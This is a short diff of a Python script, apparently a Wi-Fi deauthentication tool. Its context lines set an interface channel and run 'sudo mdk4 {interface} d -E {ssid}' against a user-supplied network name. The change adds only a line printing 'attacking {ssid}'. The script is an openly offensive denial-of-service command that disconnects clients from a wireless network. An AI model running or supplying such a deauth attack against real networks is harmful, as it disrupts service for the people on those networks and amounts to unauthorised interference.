@@ -7,6 +7,7 @@ os.system(f"sudo iwconfig {interface} channel {ent_ch}")
 try: 
   ssid = input("enter the ssid/name_of_the_wifi of the router: ")
   os.system(f"sudo mdk4 {interface} d -E {ssid}")
+  print(f"attacking {ssid}")
 except KeyboardInterrupt:
   print("exited")
 
